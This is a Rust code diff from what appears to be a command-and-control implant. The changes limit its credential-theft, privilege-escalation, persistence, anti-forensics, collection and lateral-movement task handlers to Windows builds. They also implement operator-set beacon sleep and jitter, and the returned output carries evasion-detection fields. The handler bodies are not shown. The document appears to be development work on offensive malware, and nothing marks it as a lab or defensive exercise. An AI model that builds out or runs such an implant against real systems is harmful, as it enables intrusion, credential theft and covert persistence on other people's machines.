@@ -17,12 +17,19 @@ pub fn run(task: &Task) -> TaskOutput {
         "relay_start"  => exec_relay_start(task),
         "relay_stop"   => exec_relay_stop(task),
         "inject"       => exec_inject(task),
+        #[cfg(target_os = "windows")]
         "cred"         => crate::cred::exec_cred(task),
+        #[cfg(target_os = "windows")]
         "enum"         => crate::discovery::exec_enum(task),
+        #[cfg(target_os = "windows")]
         "priv"         => crate::privesc::exec_priv(task),
+        #[cfg(target_os = "windows")]
         "persist"      => crate::persist::exec_persist(task),
+        #[cfg(target_os = "windows")]
         "antifor"      => crate::antifor::exec_antifor(task),
+        #[cfg(target_os = "windows")]
         "collect"      => crate::collect::exec_collect(task),
+        #[cfg(target_os = "windows")]
         "lateral"      => crate::lateral::exec_lateral(task),
         "file"         => crate::filemgr::exec_file(task),
         other          => TaskOutput::failure(&format!("unknown task type: {other}")),
@@ -202,10 +209,25 @@ fn inproc_getpid() -> TaskOutput {
 // Sleep / re-configure sleep
 // ---------------------------------------------------------------------------
 
-fn exec_sleep(_task: &Task) -> TaskOutput {
-    // args: JSON {"seconds": N} — updates the agent's sleep interval for next loop
-    // The actual sleep is handled by the main loop; this just acknowledges.
-    TaskOutput::success(b"sleep updated".to_vec())
+fn exec_sleep(task: &Task) -> TaskOutput {
+    let secs = args_field(task, "seconds")
+        .and_then(|s| s.parse::<u64>().ok());
+    let jitter = args_field(task, "jitter_pct")
+        .and_then(|s| s.parse::<u64>().ok());
+    let secs = match secs {
+        Some(s) if s > 0 => s,
+        _ => return TaskOutput::failure("sleep: missing or invalid seconds"),
+    };
+    let msg = format!("sleep={}s jitter={}%", secs, jitter.unwrap_or(0));
+    TaskOutput {
+        data:                msg.into_bytes(),
+        success:             true,
+        evasion_detected:    false,
+        evasion_description: None,
+        should_exit:         false,
+        new_sleep_secs:      Some(secs),
+        new_jitter_pct:      jitter,
+    }
 }
 
 // ---------------------------------------------------------------------------
